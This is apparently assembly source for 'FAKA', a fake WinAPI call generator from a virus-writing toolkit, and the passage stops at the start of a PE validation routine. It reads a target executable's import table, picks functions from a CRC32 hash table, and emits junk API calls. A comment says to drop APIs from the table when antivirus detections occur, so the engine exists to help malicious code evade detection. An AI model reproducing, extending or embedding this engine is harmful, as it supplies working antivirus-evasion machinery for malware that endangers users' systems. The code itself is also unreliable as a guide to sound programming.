;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;					xxxxxxxxxxxx    xxxxxxxxx    xxxx    xxxx    xxxxxxxxx								 ;
;					xxxxxxxxxxxx   xxxxxxxxxxx   xxxx   xxxx    xxxxxxxxxxx								 ;
;					xxxx          xxxx     xxxx  xxxx  xxxx    xxxx     xxxx							 ;
;					xxxx          xxxx     xxxx  xxxx xxxx     xxxx     xxxx							 ;
;					xxxxxxxxxx    xxxx xxx xxxx  xxxxxxxx      xxxx xxx xxxx							 ;
;					xxxxxxxxxx    xxxx xxx xxxx  xxxxxxxx      xxxx xxx xxxx							 ;
;					xxxx          xxxx     xxxx  xxxx xxxx     xxxx     xxxx							 ;
;					xxxx          xxxx     xxxx  xxxx  xxxx    xxxx     xxxx							 ;
;					xxxx          xxxx     xxxx  xxxx   xxxx   xxxx     xxxx							 ;
;					xxxx          xxxx     xxxx  xxxx    xxxx  xxxx     xxxx							 ; 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;									FAKe winApi generator												 ;
;											FAKA														 ;
;										  faka.asm														 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;											=)															 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											FAKA														 ;
;					генератор фэйковых винапишек (фэйковых вызовов винапи функций)						 ;
;																										 ;
;ВХОД (stdcall: DWORD FAKA(DWORD xparam)):																 ;
;	xparam				-	адрес структуры FAKA_FAKEAPI_GEN											 ;
;--------------------------------------------------------------------------------------------------------;
;ВЫХОД:																									 ;
;	(+)					-	сгенерированный фэйковый вызов винапишки									 ;
;	(+)					-	заполненные выходные поля структуры FAKA_FAKEAPI_GEN						 ;
;	EAX					-	адрес для дальнейшех записи кода											 ;
;--------------------------------------------------------------------------------------------------------;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;v2.0.0 


																		;m1x
																		;pr0mix@mail.ru
																		;EOF



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа FAKA
;генератор фэйк-винапи функций;
;ВХОД (stdcall DWORD FAKA(DWORD xparam)):
;	xparam		-	адрес структуры FAKA_FAKEAPI_GEN;
;ВЫХОД:
;	(+)			-	сгенерированная фэйк-винапишка
;	(+)			-	заполненные выходные поля структуры FAKA_FAKEAPI_GEN
;	EAX			-	адрес для дальнейшей записи кода; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_struct1_addr	equ		dword ptr [ebp + 24h]						;FAKA_FAKEAPI_GEN

faka_imnth			equ		dword ptr [ebp - 04]						;здесь будет храниться адрес в файле на структуру IMAGE_NT_HEADERS
faka_imagebase		equ		dword ptr [ebp - 08]						;здесь будет базовый адрес загрузки файла (aka поле OptionalHeader.ImageBase);
faka_iat_size		equ		dword ptr [ebp - 12]						;размер IAT - таблицы адресов импорта;
faka_imsh			equ		dword ptr [ebp - 16]						;IMAGE_SECTION_HEADER
faka_alloc_addr		equ		dword ptr [ebp - 20]						;адрес выделенного участка памяти
faka_tmp_esp		equ		dword ptr [ebp - 24]						;здесь сохраним значение esp (а после восстановим); 
faka_tmp_var1		equ		dword ptr [ebp - 28]						;tmp var; 

faka_stack_size		equ		5000h										;объём виртуальной памяти, выделяемой под стек (позже заменим адрес стека в esp на свой адрес в выделенной памяти - для генерации большего кол-ва функций); 

FAKA:
	pushad																;сохраним в стеке реги
	cld
	mov		ebp, esp
	sub		esp, 32
	mov		ebx, faka_struct1_addr
	assume	ebx: ptr FAKA_FAKEAPI_GEN									;ebx - адрес структуры FAKA_FAKEAPI_GEN
	and		faka_alloc_addr, 0
	mov		faka_tmp_esp, esp
	and		[ebx].nobw, 0 												;обнулим данное поле
	and		[ebx].api_va, 0												;проинициализируем данное поле -> оно = 0; 
	mov		eax, [ebx].tw_api_addr
	mov		[ebx].fnw_addr, eax											;а это поле изначально равно адресу, куда будем записывать сгенерированный трэшак; 

	cmp		[ebx].api_size, WINAPI_MAX_SIZE								;если переданное кол-во байтов для генерации фэйк-винапи меньше данного значения, тогда на выход; 
	jl		_faka_ret_ 
	cmp		[ebx].alloc_addr, 0											;есть ли варик выделить память под данные faka'и?
	je		_faka_nxt_1_
	cmp		[ebx].free_addr, 0
	je		_faka_nxt_1_

_faka_alloc_mem_:
	push	(NUM_HASH * 4 + faka_stack_size + 4)						;если есть, тогда выделим, ёпта 
	call	[ebx].alloc_addr

	test	eax, eax 
	je		_faka_nxt_1_												;если не получилось выделить память, тогда выделим её из стэка; 
	mov		faka_alloc_addr, eax										;сохраним адрес выделенной памяти в данной переменной
	lea		esp, dword ptr [eax + (NUM_HASH * 4 + faka_stack_size)]		;скорректируем esp на адрес "нового" стека

_faka_nxt_1_:
	mov		esi, [ebx].mapped_addr 
	assume	esi: ptr IMAGE_DOS_HEADER

	push	esi
	call	valid_pe													;для начала проверим на корректность файл;

	test	eax, eax													;если файл не прошел нашу проверку, нахуй он нужен - выходим;
	je		_faka_ret_
	add		esi, [esi].e_lfanew
	assume	esi: ptr IMAGE_NT_HEADERS
	mov		faka_imnth, esi												;IMAGE_NT_HEADERS
	mov		eax, [esi].OptionalHeader.ImageBase
	mov		faka_imagebase, eax											;ImageBase
	mov		ecx, [esi].OptionalHeader.DataDirectory[1 * 8].VirtualAddress
	mov		edx, [esi].OptionalHeader.DataDirectory[1 * 8].isize		;ecx = RVA IAT; edx = size of IAT;
	test	ecx, ecx													;если какое-либо из этих полей = 0, тогда IAT считаем некорректным и выходим;
	je		_faka_ret_
	test	edx, edx
	je		_faka_ret_ 
	mov		faka_iat_size, edx											;иначе, сохраним размер iat в данной переменной

	lea		eax, faka_tmp_var1
	push	eax 
	push	ecx
	push	[ebx].mapped_addr
	call	rva_to_offset												;получим по IAT_RVA адрес в файле (учитывая mapped_addr);

	test	eax, eax													;если на выходе получили 0, тогда адрес в файле не найден, а значит на выход;
	je		_faka_ret_ 
	xchg	eax, esi													;сохраним адрес IAT в файле в реге esi; 

	push	00000000h													;кладём в стэк 0 - это будет означать конец нашей таблички хэшей;
	
	cmp		[ebx].api_hash, 0											;теперь проверим, заполнено ли данное поле?
	jne		_faka_search_api_

;------------------------------------------[ТАБЛИЦА ХЭШЕЙ]-----------------------------------------------
																		;таблица хэшей от имён функций;
																		;Для того, чтобы данный движок мог генерить фэйковые вызовы новых апишек, делаем следуюющее:
																		;1) получаем хэш от имени той апишки, чей фэйковый вызов хотим генерировать (CRC32);
																		;2) кладём хэш в эту таблицу (например, push 12345678h etc);
																		;3) увеличиваем на +1 значение NUM_HASH;
																		;4) ну и конечно же пишем свою функу реализации данного вызова (наподобие тех, что уже есть) и делаем сравнение и переход на эту функу; 
																		;5) всё; 

																		;табличка хэшей - храним её в стеке;
																		;при детектах каких-то апишек, либо нахер сносим их отюсда, либо переписываем нормально генерацию; 
																		
																		;kerne32.dll
	push	0AD56B042h													;QueryPerformanceCounter
	push	03FD5EECFh													;QueryPerformanceFrequency
	push	0D6874364h													;lstrcmpiA
	push	06B3F543Dh													;lstrcmpA
	push	0AE03DF57h													;lstrcpyA
	push	0E90E2A0Ch													;lstrlenA
	push	0D22204E4h													;GetSystemTime
	push	01BB43D20h													;GetLocalTime
	push	04CCF1A0Fh													;GetVersion; 
	push	0B1530C3Eh													;GetOEMCP; 
	push	08DF87E63h													;GetCurrentThreadId
	push	0D0861AA4h													;GetCurrentProcess
	push	05B4219F8h													;GetTickCount
	push	01DB413E3h													;GetCurrentProcessId
	push	040F6426Dh													;GetProcessHeap
	push	0D777FE44h													;GetACP
	push	02D66B1C5h													;GetCommandLineA
	push	019E65DB6h													;GetCurrentThread
	push	08436F795h													;IsDebuggerPresent
	push	0516EAD48h													;GetThreadLocale
	push	0D9B20494h													;GetCommandLineW
	push	0A67EECABh													;GetSystemDefaultLangID
	push	04ABB7503h													;GetSystemDefaultLCID
	push	0E9CE019Eh													;GetUserDefaultUILanguage
	push	0380CBEEEh													;MulDiv
	push	01C58403Ch													;IsValidCodePage
	push	0F6A56750h													;GetDriveTypeA
	push	035723537h													;IsValidLocale
	push	0B1866570h													;GetModuleHandleA
	;push	03FC1BD8Dh													;LoadLibraryA
	push	0C97C1FFFh													;GetProcAddress

																		;user32
	push	06A64AAF8h													;GetFocus
	push	04B220411h													;GetDesktopWindow
	push	0AFC7EE9Ch													;GetCursor
	push	017B33F70h													;GetActiveWindow
	push	05D79D927h													;GetForegroundWindow
	push	0782D6F29h													;GetCapture
	push	010F8F6EBh													;GetMessagePos
	push	087BC6D66h													;GetMessageTime
	push	0DB0F4F04h													;GetDlgItem
	push	05736E45Dh													;GetParent
	push	005C64EA2h													;GetSystemMetrics
	push	06F2737AEh													;IsDlgButtonChecked
	push	0EBD65FA8h													;IsWindowVisible
	push	0393D7B53h													;IsIconic
	push	0C19F0C75h													;IsWindowEnabled
	push	02E102B44h													;CheckDlgButton
	push	0402F6E2Fh													;GetSysColor
	push	02B510B7Fh													;GetKeyState
	push	0FE4B0747h													;GetDlgCtrlID
	push	06B668BFAh													;GetSysColorBrush
	push	0D9ADC55Ch													;SetActiveWindow
	push	0E4191C8Bh													;IsChild
	push	01698A886h													;GetTopWindow
	push	0EF5B0128h													;GetKeyboardType
	push	0A129CDE7h													;GetKeyboardLayout
	push	049188291h													;IsZoomed
	push	0B9D3B88Dh													;GetWindowTextLengthA
	push	0DFBA6BA5h													;DrawIcon
	push	0E07C965Fh													;GetClientRect
	push	0A4E0595Ah													;GetWindowRect
	push	092626EFCh													;CharNextA
	push	089606806h													;GetCursorPos
	push	0AC9E8550h													;LoadIconA
	push	0034DF7BBh													;LoadCursorA
	push	0C1698B74h													;FindWindowA

																		;gdi32.dll
	push	0941C08E5h													;SelectObject
	push	07725AEC5h													;SetTextColor
	push	05F550585h													;SetBkColor
	push	09734E948h													;SetBkMode
	push	0CEE8783Ah													;Rectangle
	push	0783B7846h													;GetTextColor
	push	071102417h													;GetBkColor
	push	083BEBFF6h													;Ellipse
	push	05836E111h													;GetNearestColor
	push	03B9BDDD6h													;GetObjectType
	push	09420C409h													;PtVisible
	push	0A818302Eh													;GetMapMode
	push	06618FA35h													;GetBkMode
	
;------------------------------------------[ТАБЛИЦА ХЭШЕЙ]-----------------------------------------------

	mov		edx, NUM_HASH												;кол-во хешей
	mov		edi, esp													;адрес таблички хэшей
	call	rnd_swap_elem												;размешаем элементы (хэши) данной таблицы случайным образом

_faka_sa_cycle_:	
	pop		eax															;теперь берём из стэка очередной хэш 
	test	eax, eax													;и проверяем: если это ноль, тогда всю таблицу мы прогнали, выходим
	je		_faka_ret_

	mov		[ebx].api_hash, eax											;если же это хэш, то загрузим его в [ebx].api_hash

_faka_search_api_:
	call	search_api 													;и вызовем функу поиска апишки (адреса) по хэшу от её имени;

	test	eax, eax													;если нужную апишку не нашли, тогда переходим к поиску другой апишки по её хэшу;
	je		_faka_sa_cycle_
	
	mov		edi, [ebx].tw_api_addr										;иначе, в edi - адрес, куда будем писать сгенерированный вызов апишки;

																		;kernel32.dll
	cmp		eax, 04CCF1A0Fh												;эта пишка GetVersion?
	je		_faka_winapi_0_param_
	cmp		eax, 0AD56B042h												;QueryPerformanceCounter
	je		_faka_QueryPerformanceCounter_
	cmp		eax, 03FD5EECFh												;QueryPerformanceFrequency
	je		_faka_QueryPerformanceFrequency_
	cmp		eax, 0D6874364h												;lstrcmpiA
	je		_faka_lstrcmpiA_
	cmp		eax, 06B3F543Dh												;lstrcmpA
	je		_faka_lstrcmpA_
	cmp		eax, 0AE03DF57h												;lstrcpyA
	je		_faka_lstrcpyA_
	cmp		eax, 0E90E2A0Ch												;lstrlenA
	je		_faka_lstrlenA_
	cmp		eax, 0D22204E4h												;GetSystemTime
	je		_faka_GetSystemTime_
	cmp		eax, 01BB43D20h												;GetLocalTime
	je		_faka_GetLocalTime_
	cmp		eax, 0B1530C3Eh												;GetOEMCP
	je		_faka_winapi_0_param_
	cmp		eax, 08DF87E63h												;GetCurrentThreadId
	je		_faka_winapi_0_param_
	cmp		eax, 0D0861AA4h												;GetCurrentProcess
	je		_faka_winapi_0_param_
	cmp		eax, 05B4219F8h												;GetTickCount; 
	je		_faka_winapi_0_param_ 
	cmp		eax, 01DB413E3h												;GetCurrentProcessId 
	je		_faka_winapi_0_param_
	cmp		eax, 040F6426Dh												;GetProcessHeap
	je		_faka_winapi_0_param_
	cmp		eax, 0D777FE44h												;GetACP
	je		_faka_winapi_0_param_
	cmp		eax, 02D66B1C5h												;GetCommandLineA
	je		_faka_winapi_0_param_
	cmp		eax, 019E65DB6h												;GetCurrentThread
	je		_faka_winapi_0_param_
	cmp		eax, 08436F795h												;IsDebuggerPresent
	je		_faka_winapi_0_param_
	cmp		eax, 0516EAD48h												;GetThreadLocale
	je		_faka_winapi_0_param_
	cmp		eax, 0D9B20494h												;GetCommandLineW
	je		_faka_winapi_0_param_
	cmp		eax, 0A67EECABh												;GetSystemDefaultLangID
	je		_faka_winapi_0_param_
	cmp		eax, 04ABB7503h												;GetSystemDefaultLCID
	je		_faka_winapi_0_param_
	cmp		eax, 0E9CE019Eh												;GetUserDefaultUILanguage
	je		_faka_winapi_0_param_
	cmp		eax, 0380CBEEEh												;MulDiv
	je		_faka_MulDiv_
	cmp		eax, 01C58403Ch												;IsValidCodePage
	je		_faka_IsValidCodePage_
	cmp		eax, 0F6A56750h												;GetDriveTypeA
	je		_faka_GetDriveTypeA_
	cmp		eax, 035723537h												;IsValidLocale
	je		_faka_IsValidLocale_	           
	cmp		eax, 0B1866570h												;GetModuleHandleA
	je		_faka_GetModuleHandleA_
	;cmp	eax, 03FC1BD8Dh												;LoadLibraryA
	;je		_faka_LoadLibraryA_
	cmp		eax, 0C97C1FFFh												;GetProcAddress
	je		_faka_GetProcAddress_

																		;user32.dll
	cmp		eax, 06A64AAF8h												;GetFocus
	je		_faka_winapi_0_param_
	cmp		eax, 04B220411h												;GetDesktopWindow
	je		_faka_winapi_0_param_
	cmp		eax, 0AFC7EE9Ch												;GetCursor
	je		_faka_winapi_0_param_
	cmp		eax, 017B33F70h												;GetActiveWindow
	je		_faka_winapi_0_param_
	cmp		eax, 05D79D927h												;GetForegroundWindow
	je		_faka_winapi_0_param_
	cmp		eax, 0782D6F29h												;GetCapture
	je		_faka_winapi_0_param_
	cmp		eax, 010F8F6EBh												;GetMessagePos
	je		_faka_winapi_0_param_
	cmp		eax, 087BC6D66h												;GetMessageTime
	je		_faka_winapi_0_param_
	cmp		eax, 0DB0F4F04h												;GetDlgItem
	je		_faka_winapi_2_param_ 
	cmp		eax, 06F2737AEh												;IsDlgButtonChecked
	je		_faka_winapi_2_param_
	cmp		eax, 0E4191C8Bh												;IsChild
	je		_faka_winapi_2_param_
	cmp		eax, 05736E45Dh												;GetParent
	je		_faka_winapi_1_param_
	cmp		eax, 0EBD65FA8h												;IsWindowVisible
	je		_faka_winapi_1_param_
	cmp		eax, 0393D7B53h												;IsIconic
	je		_faka_winapi_1_param_
	cmp		eax, 0C19F0C75h												;IsWindowEnabled
	je		_faka_winapi_1_param_
	cmp		eax, 0FE4B0747h												;GetDlgCtrlID
	je		_faka_winapi_1_param_
	cmp		eax, 0D9ADC55Ch												;SetActiveWindow
	je		_faka_winapi_1_param_
	cmp		eax, 01698A886h												;GetTopWindow
	je		_faka_winapi_1_param_
	cmp		eax, 049188291h												;IsZoomed
	je		_faka_winapi_1_param_
	cmp		eax, 0B9D3B88Dh												;GetWindowTextLengthA
	je		_faka_winapi_1_param_
	cmp		eax, 005C64EA2h												;GetSystemMetrics
	je		_faka_GetSystemMetrics_
	cmp		eax, 02E102B44h												;CheckDlgButton
	je		_faka_CheckDlgButton_
	cmp		eax, 0402F6E2Fh												;GetSysColor
	je		_faka_GetSysColor_
	cmp		eax, 02B510B7Fh												;GetKeyState
	je		_faka_GetKeyState_
	cmp		eax, 06B668BFAh												;GetSysColorBrush
	je		_faka_GetSysColorBrush_
	cmp		eax, 0EF5B0128h												;GetKeyboardType
	je		_faka_GetKeyboardType_
	cmp		eax, 0A129CDE7h												;GetKeyboardLayout
	je		_faka_GetKeyboardLayout_
	cmp		eax, 0DFBA6BA5h												;DrawIcon
	je		_faka_DrawIcon_
	cmp		eax, 0E07C965Fh												;GetClientRect
	je		_faka_GetClientRect_
	cmp		eax, 0A4E0595Ah												;GetWindowRect
	je		_faka_GetWindowRect_
	cmp		eax, 092626EFCh												;CharNextA
	je		_faka_CharNextA_
	cmp		eax, 089606806h												;GetCursorPos
	je		_faka_GetCursorPos_
	cmp		eax, 0AC9E8550h												;LoadIconA
	je		_faka_LoadIconA_
	cmp		eax, 0034DF7BBh												;LoadCursorA
	je		_faka_LoadCursorA_
	cmp		eax, 0C1698B74h												;FindWindowA
	je		_faka_FindWindowA_

																		;gdi32.dll
	cmp		eax, 0941C08E5h												;SelectObject
	je		_faka_winapi_2_param_
	cmp		eax, 07725AEC5h												;SetTextColor
	je		_faka_SetTextColor_
	cmp		eax, 05F550585h												;SetBkColor
	je		_faka_SetBkColor_
	cmp		eax, 09734E948h												;SetBkMode
	je		_faka_SetBkMode_
	cmp		eax, 0CEE8783Ah												;Rectangle
	je		_faka_Rectangle_
	cmp		eax, 083BEBFF6h												;Ellipse
	je		_faka_Ellipse_
	cmp		eax, 0783B7846h												;GetTextColor
	je		_faka_winapi_1_param_
	cmp		eax, 071102417h												;GetBkColor
	je		_faka_winapi_1_param_
	cmp		eax, 03B9BDDD6h												;GetObjectType
	je		_faka_winapi_1_param_
	cmp		eax, 0A818302Eh												;GetMapMode
	je		_faka_winapi_1_param_
	cmp		eax, 06618FA35h												;GetBkMode
	je		_faka_winapi_1_param_
	cmp		eax, 05836E111h												;GetNearestColor
	je		_faka_GetNearestColor_
	cmp		eax, 09420C409h												;PtVisible
	je		_faka_PtVisible_
	
	jmp		_faka_ret_													;если не нашли по хэшу апишку, тогда скорректируем некоторые поля и на выход; 

_faka_winapi_0_param_:													;генерация фэйкового вызова GetVersion;
	call	faka_winapi_0_param
	jmp		_faka_crct_fields_ 

_faka_QueryPerformanceCounter_:
_faka_QueryPerformanceFrequency_:
	call	faka_QueryPerformanceCounter
	jmp		_faka_crct_fields_

_faka_lstrcmpiA_:
_faka_lstrcmpA_:
	call	faka_lstrcmpiA
	jmp		_faka_crct_fields_

_faka_lstrcpyA_:
	call	faka_lstrcpyA
	jmp		_faka_crct_fields_

_faka_lstrlenA_:
_faka_CharNextA_:
;_faka_LoadLibraryA_:
	call	faka_lstrlenA
	jmp		_faka_crct_fields_

_faka_GetSystemTime_:
_faka_GetLocalTime_:
	call	faka_GetSystemTime
	jmp		_faka_crct_fields_

_faka_MulDiv_:
	call	faka_MulDiv
	jmp		_faka_crct_fields_

_faka_IsValidCodePage_:
	call	faka_IsValidCodePage
	jmp		_faka_crct_fields_

_faka_GetDriveTypeA_:
	call	faka_GetDriveTypeA
	jmp		_faka_crct_fields_

_faka_IsValidLocale_:
	call	faka_IsValidLocale
	jmp		_faka_crct_fields_ 

_faka_winapi_2_param_:
	call	faka_winapi_2_param											;GetDlgItem etc; 
	jmp		_faka_crct_fields_

_faka_winapi_1_param_:
	call	faka_winapi_1_param
	jmp		_faka_crct_fields_ 

_faka_GetSystemMetrics_:
	call	faka_GetSystemMetrics
	jmp		_faka_crct_fields_

_faka_CheckDlgButton_:
	call	faka_CheckDlgButton
	jmp		_faka_crct_fields_

_faka_GetSysColor_:
_faka_GetSysColorBrush_:
	call	faka_GetSysColor
	jmp		_faka_crct_fields_

_faka_GetKeyState_:
	call	faka_GetKeyState
	jmp		_faka_crct_fields_

_faka_GetKeyboardType_:
	call	faka_GetKeyboardType
	jmp		_faka_crct_fields_

_faka_GetKeyboardLayout_:
	call	faka_GetKeyboardLayout
	jmp		_faka_crct_fields_

_faka_DrawIcon_:
	call	faka_DrawIcon
	jmp		_faka_crct_fields_

_faka_SetTextColor_:
_faka_SetBkColor_:
_faka_GetNearestColor_:
	call	faka_SetTextColor
	jmp		_faka_crct_fields_

_faka_SetBkMode_:
	call	faka_SetBkMode
	jmp		_faka_crct_fields_

_faka_Rectangle_:
_faka_Ellipse_:
	call	faka_Rectangle
	jmp		_faka_crct_fields_

_faka_winapi_3_param_:
_faka_PtVisible_:
	call	faka_winapi_3_param
	jmp		_faka_crct_fields_

_faka_GetClientRect_:
_faka_GetWindowRect_:
	call	faka_GetClientRect
	jmp		_faka_crct_fields_

_faka_GetModuleHandleA_:
	call	faka_GetModuleHandleA
	jmp		_faka_crct_fields_

_faka_GetCursorPos_:
	call	faka_GetCursorPos
	jmp		_faka_crct_fields_

_faka_LoadIconA_:
_faka_LoadCursorA_:
	call	faka_LoadIconA
	jmp		_faka_crct_fields_

_faka_FindWindowA_:
	call	faka_FindWindowA
	jmp		_faka_crct_fields_

_faka_GetProcAddress_:
	call	faka_GetProcAddress
	jmp		_faka_crct_fields_											;=) 

_faka_crct_fields_:														;eax = адрес для дальнейшей записи кода
	xchg	eax, edi
	mov		[ebx].fnw_addr, eax											;сохраним его в [ebx].fnw_addr
	sub		eax, [ebx].tw_api_addr										;отнимем от этого адреса адрес, куда записывали фэйковый вызов апишки
	mov		[ebx].nobw, eax 											;и получим кол-во реально записанных байтов - сохраним это значение в поле [ebx].nobw; 

_faka_ret_:
	mov		esp, faka_tmp_esp											;обязательно перед освобождением памяти нужно восстановить esp; 
	cmp		faka_alloc_addr, 0											;проверим, выделяли ли мы память под новый стек?
	je		_faka_ret_01_

	push	faka_alloc_addr												;если да, тогда освободим больше ненужную память
	call	[ebx].free_addr												; 

_faka_ret_01_: 
	mov		eax, [ebx].fnw_addr											;
	mov		dword ptr [ebp + 1Ch], eax									;eax = адрес для дальнейшей записи кода; 
	mov		esp, ebp 
	popad
	ret		04															;выходим; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи FAKA
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная func search_api
;поиск апишки, сравнивая хэш от её имени с хэшами от имен других найденных апишек
;если имена апишек совпали, тогда EAX = хэшу от имени данной апи, а в [ebx].api_va будет лежать
;VA, по которому (при работе программы) и будет находится интересующий нас адрес winapi; 
;ВХОД:
;	EBX				-	адрес структуры FAKA_FAKEAPI_GEN
;	ESI				-	адрес в файле на структуру IMAGE_IMPORT_DESCRIPTOR
;	[ebx].api_hash	-	хэш от имени винапишки, адрес которой хотим найти; 
;ВЫХОД:
;	EAX				-	хэш от имени найденной апишки или 0, если нихера не нашли; 
;	[ebx].api_hash	-	хэш от имени найденной апишки или 0, если нихера не нашли; 
;	[ebx].api_va	-	VirtualAddress, по которому (при загрузке программы, в которой мы искали) и 
;						будет лежать интересующий нас адрес винапи; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
search_api:
	push	faka_iat_size
	push	ecx															;сохраним реги
	push	edx
	push	esi
	assume	esi: ptr IMAGE_IMPORT_DESCRIPTOR

_sa_nxt_IID_cycle_:
	xor		eax, eax 
	mov		ecx, [esi].OriginalFirstThunk
	mov		edx, [esi].FirstThunk
	test	ecx, ecx													;если поле OriginalFirstThunk = 0 (а такое бывает в борладских подделках=)), 
	jne		_sa_nxt_1_
	mov		ecx, edx 													;тогда делаем ecx = полю FirstThunk
	test	edx, edx													;если оба эти поля = 0, тогда это последний элемент в массиве структур IMAGE_IMPORT_DESCRIPTOR, выходим 
	je		_sa_ret_
_sa_nxt_1_: 															;
	cmp		faka_iat_size, 0											;иначе, если размер IAT = 0, тогда на выход
	je		_sa_ret_
	
	lea		eax, faka_tmp_var1											;если же всё отлично, тогда 
	push	eax 
	push	ecx
	push	[ebx].mapped_addr
	call	rva_to_offset 												;найдём адрес в файле по RVA, который лежит в ecx;

	test	eax, eax													;если eax = 0, значит найти по RVA адрес в файле не получилосЬ. тогда на выход
	je		_sa_ret_ 
	xchg	eax, ecx													;иначе сохраним адрес в ecx;

	lea		eax, faka_imsh
	push	eax
	push	edx
	push	[ebx].mapped_addr
	call	rva_to_offset												;тоже самое проделаем, только для RVA, что лежит в edx; 

	test	eax, eax
	je		_sa_ret_ 
	xchg	eax, edx

_sa_nxt_ITD_cycle_:
	assume	ecx: ptr IMAGE_THUNK_DATA32
	cmp		[ecx].u1.Ordinal, 0											;если это поле = 0, значит это последний элемент в массиве структур IMAGE_THUNK_DATA32, тогда выйдем; 
	je		_sa_nxt_IID_ 
	bt		[ecx].u1.Ordinal, 31										;иначе, если же функа импортируется по ординалу, тогда перейдем к следующему элементу IMAGE_THUNK_DATA32; 
	jc		_sa_nxt_ITD_

	lea		eax, faka_tmp_var1
	push	eax 
	push	[ecx].u1.AddressOfData
	push	[ebx].mapped_addr											;если же функа импортируется по имени, тогда в поле AddressOfData лежит rva на структуру IMAGE_IMPORT_BY_NAME;
	call	rva_to_offset 

	test	eax, eax													;если найти адрес в файле по рва/ова/rva не получилось, тогда на выход
	je		_sa_ret_ 
	inc		eax															;пропусти поле hint и перейдем к имени импортируемой функи
	inc		eax

	push	eax															;получим хэш от её имени CRC32
	call	xCRC32A

	cmp		eax, [ebx].api_hash											;если мы нашли ту функу, что искали (хэши от имён совпали), то перепрыгнем дальше
	je		_sa_api_found_ok_ 
_sa_nxt_ITD_: 
	add		ecx, sizeof (IMAGE_THUNK_DATA32)							;иначе перейдём к следующему элементу IMAGE_THUNK_DATA32; 
	add		edx, sizeof (IMAGE_THUNK_DATA32) 							;скорректируем оба рега: ecx & edx; 
	jmp		_sa_nxt_ITD_cycle_ 
_sa_nxt_IID_:
	add		esi, sizeof (IMAGE_IMPORT_DESCRIPTOR)						;если же мы проверили все функи (структуры IMAGE_THUNK_DATA32) текущей dll (структуры IMAGE_IMPORT_DESCRIPTOR), 
	sub		faka_iat_size, sizeof (IMAGE_IMPORT_DESCRIPTOR) 			;тогда перейдем к следующей структуре IMAGE_IMPORT_DESCRIPTOR; 
	jmp		_sa_nxt_IID_cycle_
_sa_api_found_ok_:														;тут мы будем, если мы нашли нашу апишку
	mov		esi, faka_imsh												;в faka_imsh - адрес в файле на структуру IMAGE_SECTION_HEADER. Эта структура соотв-ет секции, в пределах которой лежит адрес edx (в edx - адрес в IAT, по которому будет лежать адрес нашей винапи=));
	assume	esi: ptr IMAGE_SECTION_HEADER								; 
	test	esi, esi													;если IAT расположена не в секции, а в заголовке, тогда перепрыгнем
	je		_sa_nxt_2_ 
	sub		edx, [esi].PointerToRawData									;если же IAT в секции, тогда переведем физический адрес в виртуальный (VA); 
	add		edx, [esi].VirtualAddress
_sa_nxt_2_:
	sub		edx, [ebx].mapped_addr
	add		edx, faka_imagebase
	mov		[ebx].api_va, edx											;короче, в итоге в [ebx].api_va будет лежать VA -> например это адрес 402008h. 
																		;Тогда если при загрузке проги (и дальнейшей её работе) у нас будет вот такая команда: mov eax, dword ptr [402008h], 
																		;то в eax будет лежать адрес винапи-функи; или винапи можно будет вызвать так: call dword ptr [403008h] etc;
																		;вот такая колбаса; 
_sa_ret_: 
	mov		[ebx].api_hash, eax											;тут будет либо хэш от найденной апишки, или 0, если нихрена ничего не найдено; 
	pop		esi
	pop		edx
	pop		ecx
	pop		faka_iat_size 
	ret		 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи search_api 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 

 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa valid_pe 
;проверка файла (на валидность/корректность/etc);
;ВХОД (stdcall int valid_pe(LPVOID pExe)):
;	pExe	-	база мэппинга файла;
;ВЫХОД:
;	EAX		-	0, если файл хуёвый, иначе 1; 
